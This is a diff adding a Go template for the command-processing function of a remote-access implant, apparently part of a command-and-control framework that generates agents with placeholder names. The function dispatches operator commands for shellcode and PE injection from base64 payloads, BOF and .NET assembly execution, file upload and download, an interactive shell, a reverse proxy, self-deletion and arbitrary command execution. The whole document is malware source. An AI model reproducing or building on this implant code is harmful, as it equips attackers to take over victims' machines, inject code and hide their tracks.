@@ -1,0 +1,60 @@
+// Core command processing functionality
+func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) string {
+    if strings.HasPrefix(command, "module ") {
+        encodedScript := command[7:] // Remove "module " prefix
+        result := a.{AGENT_HANDLE_MODULE_FUNC}(encodedScript)
+        return result
+    } else if strings.HasPrefix(command, "upload ") {
+        result := a.{AGENT_HANDLE_UPLOAD_FUNC}(command)
+        return result
+    } else if strings.HasPrefix(command, "download ") {
+        result := a.{AGENT_HANDLE_DOWNLOAD_FUNC}(command)
+        return result
+    } else if strings.HasPrefix(command, "tty_shell") {
+        result := a.{AGENT_HANDLE_TTY_SHELL_FUNC}(command)
+        return result
+    } else if strings.HasPrefix(command, "sleep ") {
+        result := a.{AGENT_HANDLE_SLEEP_FUNC}(command)
+        return result
+    } else if strings.HasPrefix(command, "bof ") {
+        result := a.{AGENT_HANDLE_BOF_FUNC}(command)
+        return result
+    } else if strings.HasPrefix(command, "assembly ") {
+        result := a.{AGENT_HANDLE_DOTNET_ASSEMBLY_FUNC}(command)
+        return result
+    } else if strings.HasPrefix(command, "shellcode ") {
+        // Handle shellcode injection command
+        encodedShellcode := command[10:] // Remove "shellcode " prefix
+        shellcodeData, err := base64.StdEncoding.DecodeString(encodedShellcode)
+        if err != nil {
+            return fmt.Sprintf("[ERROR] Invalid shellcode data format: %v", err)
+        }
+        result := a.{AGENT_INJECT_SHELLCODE_FUNC}(shellcodeData)
+        return result
+    } else if strings.HasPrefix(command, "peinject ") {
+        // Handle PE injection command - check for 'pe' prefix
+        encodedPE := command[9:] // Remove "peinject " prefix
+        if len(encodedPE) < 2 || !strings.HasPrefix(encodedPE, "pe") {
+            return "[ERROR] PE injection command must start with 'pe' prefix"
+        }
+        encodedData := encodedPE[2:] // Remove "pe" prefix
+        peData, err := base64.StdEncoding.DecodeString(encodedData)
+        if err != nil {
+            return fmt.Sprintf("[ERROR] Invalid PE data format: %v", err)
+        }
+        result := a.{AGENT_INJECT_PE_FUNC}(peData)
+        return result
+    } else if command == "reverse_proxy_start" {
+        go a.{AGENT_START_REVERSE_PROXY_FUNC}()
+        return "[+] Reverse proxy started."
+    } else if command == "reverse_proxy_stop" {
+        a.{AGENT_STOP_REVERSE_PROXY_FUNC}()
+        return "[+] Reverse proxy stopped."
+    } else if command == "kill" {
+        a.{AGENT_SELF_DELETE_FUNC}()
+        return "[SUCCESS] Agent killed"
+    } else {
+        result := a.{AGENT_EXECUTE_FUNC}(command)
+        return result
+    }
+}
